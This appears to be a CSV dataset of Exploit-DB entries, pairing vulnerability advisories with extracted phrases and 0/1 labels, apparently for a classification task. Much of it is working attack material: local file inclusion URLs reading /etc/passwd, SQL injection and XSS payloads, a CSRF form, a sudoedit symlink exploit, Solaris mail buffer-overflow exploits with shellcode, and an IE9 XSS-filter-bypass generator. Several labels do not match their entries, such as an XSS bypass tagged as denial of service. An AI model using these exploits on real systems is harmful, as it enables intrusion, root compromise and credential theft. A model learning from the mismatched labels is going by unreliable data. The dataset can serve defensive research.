31318,Centreon 1.4.2.3 - 'index.php' Local File Inclusion source: https://www.securityfocus.com/bid/28052/info  Centreon is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  Exploiting this issue may allow an attacker to obtain potentially sensitive information that may lead to further attacks.  This issue affects Centreon 1.4.2.3; other versions may also be vulnerable.  http://www.example.com/include/doc/index.php?page=../../www/oreon.conf.php http://www.example.com/include/doc/index.php?page=../../../../../etc/passwd http://www.example.com/include/doc/index.php?page=[Local File],fails to properly sanitize user-supplied input,1
28820,"Webgenius Goop Gallery 2.0 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/20554/info  GOOP Gallery is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/goopgallery/index.php?next=%BB&gallery=demo+gallery+1I=Bunny.JPG"">[XSS-CODE] http://www.example.com/goopgallery/index.php?gallery=demo+gallery+1I=Bunny.JPG"">[XSS-CODE]",have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site,1
29359,"DMXReady Secure Login Manager 1.0 - 'content.asp?sent' SQL Injection source: https://www.securityfocus.com/bid/21788/info   DMXReady Secure Login Manager is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.    A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.   These issues affect Secure Login Manager 1.0; other versions may also be vulnerable.  http://www.example.com/content.asp?mid=31&incid=17&sent=[sql]",the application fails to properly sanitize user-supplied input before using it in SQL queries,0
35472,"Offset2lib - Bypassing Full ASLR On 64 bit Linux -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  +------------------------------------------------------------------------------+ | Packet Storm Advisory 2014-1204-1                                            | | http://packetstormsecurity.com/                                              | +------------------------------------------------------------------------------+ | Title: Offset2lib: Bypassing Full ASLR On 64bit Linux                        | +--------------------+---------------------------------------------------------+ | Release Date       | 2014/12/04                                              | | Advisory Contact   | Packet Storm (advisories@packetstormsecurity.com)       | | Researchers        | Hector Marco and Ismael Ripoll                          | +--------------------+---------------------------------------------------------+ | System Affected    | 64 bit PIE Linux                                        | | Classification     | 1-day                                                   | +--------------------+---------------------------------------------------------+  +----------+ | OVERVIEW | +----------+  The release of this advisory provides exploitation details in relation  a weakness in the Linux ASLR implementation.  The problem appears when  the executable is PIE compiled and it has an address leak belonging to  the executable.  These details were obtained through the Packet Storm Bug Bounty program  and are being released to the community.  +------------------------------------------------------------------------------+  +---------+ | DETAILS | +---------+  An attacker is able to de-randomize all mmapped areas (libraries, mapped files, etc.)  by knowing only an address belonging to the application and the offset2lib value.  +------------------------------------------------------------------------------+  +------------------+ | PROOF OF CONCEPT | +------------------+  The proof of concept exploit code is available here: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/35472.tgz http://packetstormsecurity.com/files/129398  +------------------------------------------------------------------------------+  +---------------+ | RELATED LINKS | +---------------+  http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html  +------------------------------------------------------------------------------+   +----------------+ | SHAMELESS PLUG | +----------------+  The Packet Storm Bug Bounty program gives researchers the ability to profit  from their discoveries.  You can get paid thousands of dollars for one day  and zero day exploits.  Get involved by contacting us at  getpaid@packetstormsecurity.com or visit the bug bounty page at:   http://packetstormsecurity.com/bugbounty/  -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.11 (GNU/Linux)  iEYEARECAAYFAlSBA04ACgkQrM7A8W0gTbG0jwCdH5CHOIDO9ELRcrPhQmf5FF4z TgQAn2zuwadnWdMueC8gUQPT5gCmrQyp =iegV -----END PGP SIGNATURE-----","de-randomize all mmapped areas (libraries, mapped files, etc.)",0
24606,"Sudo 1.6.8 - Information Disclosure // source: https://www.securityfocus.com/bid/11204/info  Sudo is reported prone to an information disclosure vulnerability.  This vulnerability presents itself when sudo is called with the '-e' option, or the 'sudoedit' command is invoked. In certain circumstances, attackers may access the contents of arbitrary files with superuser privileges.  Version 1.6.8 is reported susceptible to this vulnerability.  /*             Copyright ? Rosiello Security 2004                 http://www.rosiello.org                    sudoedit Exploit   SOFTWARE : sudoedit REFERENCE: http://www.sudo.ws/sudo/alerts/sudoedit.html DATE: 18/09/2004  Summary: A flaw in exists in sudo's -u option (aka sudoedit) in sudo version 1.6.8 that can give an attacker read permission to a file that would otherwise be unreadable.  Sudo versions affected: 1.6.8 only  Credit: Reznic Valery discovered the problem.  -----------------------------------------------------------  All the information that you can find in this software were published for educational and didactic purpose only. The author published this program under the condition that is not in the intention of the reader to use them in order to bring to himself or others a profit or to bring to others damage.  !Respect the law!  How do I use this code ?  To exploit sudoedit you have to open with it the file ""rosiello"" as shown in the example.  EXAMPLE SCENARIO:  1) Open two shells (i) and (ii); 2) (i)$sudoedit rosiello; 3) (ii)$./sudoedit-exploit /etc/shadow; 4) (i) close sudoedit.  The file ""rosiello"" is now a copy of ""/etc/shadow"".  AUTHOR : Angelo Rosiello CONTACT: angelo@rosiello.org  */  #include <stdio.h> #include <sys/stat.h> #include <string.h> #include <sys/types.h> #include <fcntl.h> #include <stdio.h> #include <dirent.h>   int main( int argc, char *argv[] ) {         char PATH[]=""/usr/tmp"";         char file[32];         DIR *tmp;         struct dirent *de;         tmp = opendir ( PATH );         int found = 0;          printf( ""Copyright ?? Rosiello Security 2004\n"" );         printf( ""http://www.rosiello.org\n"" );          if( argc!=2 )         {                 printf( ""USAGE: %s file\n"", argv[0] );                 return( 0 );         }           while ( (de = readdir ( tmp ))!= NULL )         {                 if ( (strstr(de->d_name, ""rosiello"") != NULL) )                 {                         if( strlen(de->d_name) > 24 ) return( 0 );                         sprintf( file, ""%s/%s"", PATH, (char *)de->d_name );                         remove( file );                         if( fork()!=0 )                         {                                 execl( ""/bin/ln"", ""ln"", ""-s"", argv[1], file, NULL );                         }                         wait( );                         printf( ""Now you can close sudoedit and reopen rosiello!\n"" );                         found=1;                         goto end;                  }          }         end:         closedir( tmp );          if( !found )                 printf( ""File Not Found!\n"" );         return( 0 );  }",information disclosure,1
37845,"Flash - Uninitialized Stack Variable MPD Parsing Memory Corruption Source: https://code.google.com/p/google-security-research/issues/detail?id=316&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id  [Tracking for: https://code.google.com/p/chromium/issues/detail?id=472201]  Credit is to bilou, working with the Chromium Vulnerability Rewards Program.  --- VULNERABILITY DETAILS Loading a weird MPD file can corrupt flash player's memory.  VERSION Chrome version 41.0.2272.101, Flash 17.0.0.134 Operating System: Win 7 x64 SP1  REPRODUCTION CASE I'm ripping most of this from scarybeasts' sources. I'm sure he's ok with that =D.  ""To reproduce, host the attached SWF and other files on a web server (e.g. localhost) and load it like this:""  ""http://localhost/PlayManifest.swf?file=gen.mpd  ""To compile the .as file, I had to use special flags to flex:""  ""mxmlc -target-player 14.0 -swf-version 25 -static-link-runtime-shared-libraries ./PlayManifest.as"" ""(This also requires that you have v14.0 of playerglobals.swc installed. Any newer version should also be fine.)""   On Win7 x64 sp1 with Chrome 32 bit, crash like this: 6AA8B67C | 8B C3                    | mov eax,ebx                             | 6AA8B67E | E8 A1 05 00 00           | call pepflashplayer.6AA8BC24            | 6AA8B683 | EB A8                    | jmp pepflashplayer.6AA8B62D             | 6AA8B685 | 89 88 D0 00 00 00        | mov dword ptr ds:[eax+D0],ecx           |  // crash here, eax points somewhere in pepflashplayer.dll 6AA8B68B | 8B 88 88 00 00 00        | mov ecx,dword ptr ds:[eax+88]           | 6AA8B691 | 33 D2                    | xor edx,edx                             | 6AA8B693 | 3B CA                    | cmp ecx,edx                             | 6AA8B695 | 74 07                    | je pepflashplayer.6AA8B69E              | 6AA8B697 | 39 11                    | cmp dword ptr ds:[ecx],edx              | 6AA8B699 | 0F 95 C1                 | setne cl                                |   At first sight this looks to be an uninitialized stack variable but I might be wrong. ---  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37845.zip",corrupt flash player's memory,1
39559,"TeamPass 2.1.24 - Multiple Vulnerabilities Affected Product:    TeamPass Vulnerability Type:  	Multiple XSS,CSRF, SQL injections Fixed in Version:	2.1.25 (https://github.com/nilsteampassnet/TeamPass/releases/tag/2.1.25.0) Vendor Website:      	http://www.teampass.net Software Link: : 	https://github.com/nilsteampassnet/TeamPass Affected Version:	2.1.24 and prior  Vulnerable software (including source) : https://github.com/nilsteampassnet/TeamPass/releases/tag/2.1.24.4 Google Dork: intitle:""Teampass"" + inurl:index.php?page=items Tested on: Ubuntu Remote Exploitable:  Yes Reported to vendor:  30 december 2015 Disclosed to public: 14 March 2016 Release mode:        Responsible Disclosure CVE-2015-7562 TeamPass 2.1.24 Persistant XSS  CVE-2015-7563 TeamPass 2.1.24 CSRF  CVE-2015-7564 TeamPass 2.1.24 SQL Injection  Credits:              Vincent Malguy   Description : TeamPass is a Passwords Manager dedicated for managing passwords in a collaborative way on any server Apache, MySQL and PHP. It is especially designed to provide passwords access security for allowed people. This makes TeamPass really useful in a Business/Enterprise environment and will provide to IT or Team Manager a powerful and easy tool for customizing passwords access depending on the user’s role.  Copyright (c) 2009-2015, Nils Laumaillé  ********************* CVE-2015-7562 TeamPass 2.1.24 Persistant XSS  ********************* When displaying the detail of an item (a password entry), the ""label"" value is display using the stripslashes() sanitization function. This function does not efficiently  prevent XSS. POC of a persistant XSS : add  item with label : $str = ""' onclick='javascript:alert(""XSS found"");' alt='"";echo ""<a href='"". strip_tags($str) .""'></a>""; This xss will be trigger each time a user click on this item.  As item can be share, there is a way for a user to trick an admin to trigger this xss. fix in commit cd112ea (see https://github.com/nilsteampassnet/TeamPass/pull/1140)  POC of a persistant XSS :  Add a new role with name  : <script>alert(""XSS"");</script>  This xss will be trigger in many admin pages Fix in commit : 3f0a6c9 & e29cd54 & 295cada & 2c8a829 (see https://github.com/nilsteampassnet/TeamPass/pull/1140)  ********************* CVE-2015-7563 TeamPass 2.1.24 CSRF  ********************* Lack of anti-CSRF token lead to security vulnerabilities where an attacker can trick a authenticated user to do some unwanted action on his behalf :  <form action=""http://<teampass host>/sources/main.queries.php"" method=""post"">     <select name=""type"">     <option value=""increase_session_time »>will add 1 hour timeout to the user session</option> </select>     <input type=submit>   </form>     recommanded fix: add anti-CSRF token.  ********************* CVE-2015-7564 TeamPass 2.1.24 SQL Injections   ********************* SQL injection has been found in item.query.php parameter id with type set to action_on_quick_icon. Sqlmap output  : --- Parameter: id (POST) Type: boolean-based blind Title: MySQL >= 5.0 boolean-based blind - Parameter replace Payload: type=action_on_quick_icon&id=(SELECT (CASE WHEN (6144=6144) THEN 6144 ELSE 6144*(SELECT 6144 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&action=1  —  fix in commit 795256f (see https://github.com/nilsteampassnet/TeamPass/pull/1140)   SQL injections has been found in view.query.php in parameters order and direction with type set to connections_logs, errors_logs or access_logs . Note that direction need to be prefixed by "", ""  in order to be exploitable Sqlmap output  for connections_logs: --- Parameter: order (POST)     Type: boolean-based blind     Title: MySQL >= 5.0 boolean-based blind - Parameter replace     Payload: type=connections_logs&order=(SELECT (CASE WHEN (6688=6688) THEN 6688 ELSE 6688*(SELECT 6688 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&direction=DESC      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 AND time-based blind (SELECT)     Payload: type=connections_logs&order=date AND (SELECT * FROM (SELECT(SLEEP(5)))vhPw)&direction=DESC —  --- Parameter: direction (POST)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: type=errors_logs&order=date&direction=,  (SELECT (CASE WHEN (1739=1739) THEN 1739 ELSE 1739*(SELECT 1739 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END)) — fix commit 86719e0 (see https://github.com/nilsteampassnet/TeamPass/pull/1140)",information disclosure,1
28870,"PunBB 1.x - SQL Injection source: https://www.securityfocus.com/bid/20786/info  PunBB is prone to multiple input-validation vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may exploit these issues to execute arbitrary script code in the context of the webserver process or to pass malicious input to database queries, resulting in the modification of query logic or other attacks. Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  PunBB 1.2.13 and prior versions are vulnerable; other versions may also be affected.  http://www.example.com/search.php?action=search&keywords=hello&author=&forum=-1&search_in=all&sort_by=0&sort_dir=DESC&show_as=topics&search=1&result_list[< UNION SQL QUERY >/*]&1763905137=1&1121320991=1",fails to sufficiently sanitize user-supplied data,1
5338,"ChilkatHttp ActiveX 2.3 - Arbitrary Files Overwrite --------------------------------------------------------------------  ChilkatHttp ActiveX 2.3 Arbitrary Files Overwrite  url: www.chilkatsoft.com   Author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://shinnai.altervista.org   This was written for educational purpose. Use it at your own risk.  Author will be not responsible for any damage. -------------------------------------------------------------------- <object classid='clsid:B973393F-27C7-4781-877D-8626AAEDF119' id='test'></object>  <input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>  <script language='vbscript'>  Sub tryMe   test.SaveLastError ""c:\windows\system_.ini""   MsgBox ""Exploit completed!""  End Sub </script>  # milw0rm.com [2008-04-01]",code execution,1
21193,"DeleGate 7.7.1 - Cross-Site Scripting source: https://www.securityfocus.com/bid/3749/info  DeleGate is a proxy server which runs on Linux , Unix, Microsoft Windows and OS/2 platforms. It is capable of translating a number of protocols(HTTP, FTP, NNTP, POP, Telnet, etc.) between client and server.  DeleGate is prone to cross-site scripting attacks. HTML tags are not filtered from links to error pages. As a result, it is possible for an attacker to insert malicious script code into a link to a site running DeleGate. When a web user clicks the link an error page will be displayed and the script code will be executed on the web user in the context of the site running DeleGate.  Such an attack may be used to steal a legitimate user's cookie-based authentication credentials.   http://IP_Address_of_DeleGate/<script>alert(""aaa"");</script>",insert malicious script code into a link to a site running DeleGate,1
19648,"Solaris 7.0 - CDE dtmail/mailtool Buffer Overflow // source: https://www.securityfocus.com/bid/832/info  here are three buffer overflow vulnerabilities in the CDE mail utilities, all of which are installed sgid mail by default.  The first is exploited through overrunning a buffer in the Content-Type: field, which would look something like this:  Content-Type: image/aaaaaaaa long 'a' aaaaaa; name=""test.gif""  mailtool will overflow when email is selected which has a content-type field like that. It may be possible for an attacker to obtain root priviliges if shellcode is written appropriately and root selects the malicious email message.  The second vulnerability is in dtmail, which will crash (and possibly execute arbitrary code) if a long paramater is passed argumenting the -f command-line option.  The third is in mailpr, which is vulnerable to a long -f paramater as well.  The most basic consequence of these being exploited is a compromise of local email, since all mail data is set mode 660, read and write permissions granted for members of group mail.  As of November 30, 1999, Solaris 7 is the only known vulnerable platform.  ex_mailtool.c ----- /*=============================================================================    Solaris mailtool exploit for Solaris7 Intel Edition    The Shadow Penguin Security (http://shadowpenguin.backsection.net)    Written by UNYUN  (shadowpenguin@backsection.net)    Descripton:      Local user can read/write any user's mailbox    Usage:      setenv DISPLAY yourdisply      gcc ex_mailtool.c      ./a.out /var/mail/[any user]      - Choice ""exploit@localhost"" mail   ============================================================================= */  #include <stdio.h>  #define FAKEADR 96 #define FAKEOFS 0x1000 #define RETADR  84 #define RETOFS  0x1224 #define EXPADR  300 #define NOP     0x90 #define MAXBUF  2000 #define DIR     ""/usr/openwin/bin""  #define HEAD \ ""From exploit@localhost Fri Nov 26 00:01 JST 1999\n""\ ""Content-Type: multipart/mixed; ""\ ""boundary=\""VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==\""\n""\ ""Content-Length: 340\n\n""\ ""--VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==\n""\ ""Content-Type: image/%s; name=\""test.gif\""\n""\ ""Content-Disposition: attachment;\n""\ "" filename=\""test.gif\""\n""\ ""Content-Transfer-Encoding: base64\n\n""\ ""IA==\n\n""\ ""--VGh1LCAyNSBOb3YgMTk5OSAyMjozOTo1MSArMDkwMA==--\n\n""  unsigned long get_sp(void) {   __asm__("" movl %esp,%eax ""); }  char exploit_code[2000] = ""\xeb\x1c\x5e\x33\xc0\x33\xdb\xb3\x08\xfe\xc3\x2b\xf3\x88\x06"" ""\x6a\x06\x50\xb0\x88\x9a\xff\xff\xff\xff\x07\xee\xeb\x06\x90"" ""\xe8\xdf\xff\xff\xff\x55\x8b\xec\x83\xec\x08\xeb\x5d\x33\xc0"" ""\xb0\x3a\xfe\xc0\xeb\x16\xc3\x33\xc0\x40\xeb\x10\xc3\x5e\x33"" ""\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e\x06\xeb\x05\xe8\xec"" ""\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3\x5e\x33\xc0\x89"" ""\x76\x08\x88\x46\x07\x33\xd2\xb2\x06\x02\xd2\x89\x04\x16\x50"" ""\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xb5\xff\xff\xff\x33\xd2"" ""\xb2\x06\x02\xd2\x03\xe2\x6a\x01\xe8\xaf\xff\xff\xff\x83\xc4"" ""\x04\xe8\xc9\xff\xff\xff/tmp/xx"";  main(int argc, char *argv[]) {     static char     buf[MAXBUF];     FILE        *fp;     unsigned int    i,ip,sp;      if (argc!=2){         printf(""usage : %s mailbox\n"",argv[0]);         exit(1);     }     putenv(""LANG="");     sp=get_sp();     system(""ln -s /bin/ksh /tmp/xx"");     printf(""esp  = 0x%x\n"",sp);     memset(buf,NOP,MAXBUF);     buf[MAXBUF-1]=0;      ip=sp-FAKEOFS;     printf(""fake = 0x%x\n"",ip);     buf[FAKEADR  ]=ip&0xff;     buf[FAKEADR+1]=(ip>>8)&0xff;     buf[FAKEADR+2]=(ip>>16)&0xff;     buf[FAKEADR+3]=(ip>>24)&0xff;     ip=sp-RETOFS;     printf(""eip  = 0x%x\n"",ip);     buf[RETADR  ]=ip&0xff;     buf[RETADR+1]=(ip>>8)&0xff;     buf[RETADR+2]=(ip>>16)&0xff;     buf[RETADR+3]=(ip>>24)&0xff;      strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));      if ((fp=fopen(argv[1],""ab""))==NULL){         printf(""Can not write '%s'\n"",argv[1]);         exit(1);     }     fprintf(fp,HEAD,buf);     fclose(fp);     printf(""Exploit mail has been added.\n"");     printf(""Choice \""exploit@localhost\"" mail.\n"");     sprintf(buf,""cd %s; mailtool"",DIR);     system(buf); }   ex_mailtool.c ----- /*=============================================================================    Solaris dtmailpr exploit for Solaris7 Intel Edition    The Shadow Penguin Security (http://shadowpenguin.backsection.net)    Written by UNYUN  (shadowpenguin@backsection.net)    Descripton:      Local user can read/write any user's mailbox   ============================================================================= */  #include <stdio.h>  #define RETADR  1266 #define RETOFS  0x1d88 #define EXPADR  300 #define NOP 0x90 #define MAXBUF  2000  unsigned long get_sp(void) {   __asm__("" movl %esp,%eax ""); }  char exploit_code[2000] = ""\xeb\x1c\x5e\x33\xc0\x33\xdb\xb3\x08\xfe\xc3\x2b\xf3\x88\x06"" ""\x6a\x06\x50\xb0\x88\x9a\xff\xff\xff\xff\x07\xee\xeb\x06\x90"" ""\xe8\xdf\xff\xff\xff\x55\x8b\xec\x83\xec\x08\xeb\x5d\x33\xc0"" ""\xb0\x3a\xfe\xc0\xeb\x16\xc3\x33\xc0\x40\xeb\x10\xc3\x5e\x33"" ""\xdb\x89\x5e\x01\xc6\x46\x05\x07\x88\x7e\x06\xeb\x05\xe8\xec"" ""\xff\xff\xff\x9a\xff\xff\xff\xff\x0f\x0f\xc3\x5e\x33\xc0\x89"" ""\x76\x08\x88\x46\x07\x33\xd2\xb2\x06\x02\xd2\x89\x04\x16\x50"" ""\x8d\x46\x08\x50\x8b\x46\x08\x50\xe8\xb5\xff\xff\xff\x33\xd2"" ""\xb2\x06\x02\xd2\x03\xe2\x6a\x01\xe8\xaf\xff\xff\xff\x83\xc4"" ""\x04\xe8\xc9\xff\xff\xff/tmp/xx"";  main() {     static char     buf[MAXBUF+1000];     FILE        *fp;     unsigned int    i,ip,sp;      putenv(""LANG="");     sp=get_sp();     system(""ln -s /bin/ksh /tmp/xx"");     printf(""esp  = 0x%x\n"",sp);     memset(buf,NOP,MAXBUF);     ip=sp-RETOFS;     printf(""eip  = 0x%x\n"",ip);     buf[RETADR  ]=ip&0xff;     buf[RETADR+1]=(ip>>8)&0xff;     buf[RETADR+2]=(ip>>16)&0xff;     buf[RETADR+3]=(ip>>24)&0xff;     strncpy(buf+EXPADR,exploit_code,strlen(exploit_code));     buf[MAXBUF-1]=0;     execl(""/usr/dt/bin/dtmailpr"",""dtmailpr"",""-f"",buf,0); }",obtain root priviliges if shellcode is written appropriately and root selects the malicious email message,1
22100,"Microsoft Internet Explorer 9 - Cross-Site Scripting Filter Bypass ################################################# Internet Explorer 9 XSS Filter Bypass #################################################   Discovered by: Jean Pascal Pereira <pereira@secbiz.de>   Vendor information:   ""Internet Explorer (formerly Microsoft Internet Explorer and Windows Internet Explorer, commonly   abbreviated IE or MSIE) is a series of graphical web browsers developed by Microsoft and included as part of the Microsoft   Windows line of operating systems, starting in 1995. It was first released as part of the add-on package Plus! for Windows 95   that year. Later versions were available as free downloads, or in service packs, and included in the OEM service releases of   Windows 95 and later versions of Windows..""   Vendor URI: http://www.microsoft.com   #################################################   Issue: Cross Site Scripting Filter Bypass   -------------------------------------  Description:  The Internet Explorer 9 offers a feature to eliminate suspicious pattern passed to the website by a   parameter.  For example, we have the following script:  -------------------------------------  <?php  echo $_GET['a'];  ?>  -------------------------------------  Let's call it ""blah.php"". Now we access the blah.php by using Internet Explorer 9 and try to execute a   malicious string:  http://localhost/ieb/blah.php?a=<script>alert(1)</script>  After this, we receive the message ""Internet Explorer has modified this page to help prevent cross-  site scripting"".  The JavaScript won't be executed.  -------------------------------------   Proof Of Concept:   This trick may be known to some of you. Internet Explorer allows stripping tags by inserting   nullbytes.  For example, the following string will be executed:  3C 73 00 63 72 69 70 74 3E 61 6C 65 72 74 28 31 29 3C 2F 73 00 63 72 69 70 74 3E  Which is actually ""<s[NULL]cript>alert(1)</s[NULL]cript>"".  However, we won't be able to insert the nullbytes directly in the URI. The following example won't   work:  http://localhost/ieb/blah.php?a=<s%00cript>alert(1)</s%00cript>  But there is still another possibility. Grab a hex editor and create a file looking like the example   given below:  <a href='http://localhost/ieb/blah.php?a=<s[NULL]cript>alert(1)</s[NULL]cript>'>Clickme</a>  If you open the file and click the provided link, the script will be executed.   -------------------------------------  Exploit (for the lazy folks):  -------------------------------------  #!/usr/bin/perl  use strict; use warnings;  # Internet Explorer 9 XSS Filter Bypass Generator # Credit: Jean Pascal Pereira <pereira[at]secbiz.de> # http://0xffe4.org  my $target  = shift || die(""No target defined""); my $payload = shift || die(""No payload defined""); my $lnk_txt = shift || ""Click me :)"";  open(OUT, "">:raw"", ""out.html"");  print OUT ""\x3C\x61\x20\x68\x72\x65\x66\x3D\x27"";  print OUT $target;  print OUT ""\x3C\x73\x00\x63\x72\x69\x70\x74\x3E"";  print OUT $payload;  print OUT ""\x3C\x2F\x73\x00\x63\x72\x69\x70\x74\x3E\x27\x3E"";  print OUT $lnk_txt;  print OUT ""\x3C\x2F\x61\x3E"";  close(OUT);  -------------------------------------  Example usage is:  iefilter.pl http://www.example.com?var= alert(1)  -------------------------------------  Note:  Exploitation via <a href=""ja[NULL]vascript:... links is also possible.  -------------------------------------   Solution:   Currently, no solution is available for this issue.   -------------------------------------   #################################################  < http://0xffe4.org >",denial of service,1
17952,"KaiBB 2.0.1 - SQL Injection Advisory:              		KaiBB 2.0.1 XSS and SQL Injection vulnerabilities Advisory ID:           	SSCHADV2011-027 Author:                		Stefan Schurtz Affected Software:  	Successfully tested on KaiBB 2.0.1 Vendor URL:          	http://code.google.com/p/kaibb/ Vendor Status:       	informed CVE-ID:                	 	-  ========================== Vulnerability Description: ==========================  KaiBB 2.0.1 is prone to XSS and SQL Injection vulnerabilities  ================== Technical Details: ==================  Cross-site Scripting  http://<target>/kaibb/?'</script><script>alert(document.cookie)</script> http://<target>/kaibb/index.php?'</script><script>alert(document.cookie)</script>  SQL Injection  http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL AND 'a'='a http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, version(), NULL, NULL, NULL, NULL, NULL AND 'a'='a http://<target>/kaibb/rss.php?forum=' UNION ALL SELECT NULL, user(), NULL, NULL, NULL, NULL, NULL AND 'a'='a  ========= Solution: =========  -  ==================== Disclosure Timeline: ====================  08-Oct-2011 - informed developers 08-Oct-2011 - release date of this security advisory  ======== Credits: ========  Vulnerability found and advisory written by Stefan Schurtz.  =========== References: ===========  http://code.google.com/p/kaibb/ http://code.google.com/p/kaibb/issues/detail?id=2 http://www.rul3z.de/advisories/SSCHADV2011-027.txt",information disclosure,1
